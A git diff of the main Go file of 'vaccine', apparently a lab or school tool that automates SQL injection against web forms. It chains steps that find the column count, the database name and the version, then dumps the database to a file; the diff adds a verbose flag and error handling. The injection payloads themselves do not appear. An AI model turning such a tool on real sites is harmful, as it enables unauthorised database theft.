@@ -1,44 +1,38 @@
 package main
 
 import (
-	"fmt"
 	"net/http"
 	"log"
 	"net/url"
 	"os"
 )
 
-//http://127.0.0.1:8080/vulnerabilities/sqli/
-// c6derp6ibht228uh4nj5pjogq7
 type Input struct {
 	filename string
 	method string
 	baseURL string
+	verbose bool
 	session string
 	sessionCookie  []*http.Cookie
 }
 
 func Start(input *Input) {
-	client := HttpClient{input.baseURL, input.sessionCookie}
+	client := HttpClient{input.baseURL, input.sessionCookie, input.verbose}
 	scraper := Scraper{&client}
-	forms := scraper.GetPageValues()
+	forms := scraper.GetPageValues(input.method)
 	injector := SqlInjector{&client, forms, input.baseURL, "", "--", "", "", ""}
-	injector.GetSyntaxError() 
-	injector.GetColumnNumber()
-	injector.GetDatabaseName()
-	injector.GetDatabaseVersion()
-
-	if len(injector.comment) == 0 || len(injector.escape) == 0 || len(injector.db) == 0 || len(injector.dbVersion) == 0 {
-		fmt.Println("Data could not be injected. Try again.")
-		return
-	}
-	injector.GetDatabaseDump(input.filename)
+	if err := injector.Initialize(); err != nil {
+        log.Fatal("Error initializing SQL injector: ", err)
+    }
+	if err := injector.GetDatabaseDump(input.filename); err != nil {
+        log.Fatal("Error getting database dump: ", err)
+    }
 }
 
 func ParseInput(input *Input) {
 	args := os.Args
 	var flagIndex int
-	usageMsg := "usage: ./vaccine [-oX] URL"
+	usageMsg := "usage: ./vaccine [-osvX] URL"
 	if len(args) <= 1 {
 		log.Fatal(usageMsg)
 	}
@@ -60,10 +54,15 @@ func ParseInput(input *Input) {
 			case "-X":
 				input.method = args[i]
 			case "-s":
-				input.session= args[i]
+				input.session = args[i]
 			}
+		case "-v":
+			input.verbose = true
 
 		default:
+			if len(input.baseURL) > 0 {
+				log.Fatal(usageMsg)
+			} 
 			u, err := url.Parse(args[i]); if err != nil {
 				log.Fatal(usageMsg)
 			}
@@ -77,7 +76,7 @@ func ParseInput(input *Input) {
 }
 
 func main() {
-	input := Input{"db_dump.txt", "GET", "", "", nil}
+	input := Input{"db_dump.txt", "GET", "", false, "", nil}
 	ParseInput(&input) 
 	if len(input.session) > 0 {
 		sessionCookie := []*http.Cookie{
